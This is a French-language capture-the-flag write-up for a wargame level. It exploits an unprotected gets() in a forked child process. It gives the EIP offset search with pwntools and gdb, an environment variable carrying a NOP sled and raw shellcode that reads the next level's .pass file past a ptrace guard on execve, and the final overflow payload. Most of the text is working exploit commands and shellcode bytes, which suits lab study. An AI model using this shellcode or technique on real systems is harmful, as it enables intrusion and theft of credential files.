Il y a un gets(&buf) non protege dans le code auquel seul l'enfant a acces quand on fork() le programme
On va redirigier l'eip vers l'adresse d'un shellcode qui lit le fichier /home/users/level05/.pass que l'on placera dans une variable d'environnement. On ne peut passer juste exectuer un shell comme d'habitude car y a une garde :
if (ptrace(PTRACE_PEEKUSER, eax, 0x2c, 0) != 0xb) qui veut dire "si le syscall courant n'est pas execve(...)"
le programme fait un continue sinon il kill le processus et fait un break. donc on ne peut pas executer de shell

Il faut trouver l'offset de eip :

python -c "from pwn import *; print(cyclic(200).decode())"


(gdb) set follow-fork-mode child
(gdb) r
aaaabaaacaaadaaaeaaafa...

ceci donne : 

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1781]
0x6261616f in ?? ()

python -c "from pwn import *; print(cyclic_find(0x6261616f))"

L'offset est 156

Maintenant on va creer une variable d'environnement qui contient le shell code et voir a quelle adresse il sera stocke

env -i payload=$(python -c 'print "\x90"*500+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"') gdb ./level04

on rempli avec des \x90 qui equivaut a NOP, pour etre sur de tomber sur notre shellcode et ne pas avoir a chercher l'adresse exact dans l'env

(gdb) b main
(gdb) r
(gdb) x/500s environ


20\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffde4e:	 "\220\220\220\220\220\220\220\220\220...

on prend une adresse au mileu de NOP : 0xffffde4e en litte edian \x4e\xde\xff\xff

on peut construire notre payload

python -c "print 156 * 'a' + '\x4e\xde\xff\xff'" > /tmp/exploit

cat /tmp/exploit - | env -i payload=$(python -c 'print "\x90"*500+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"') ./level04

on obtient le flag





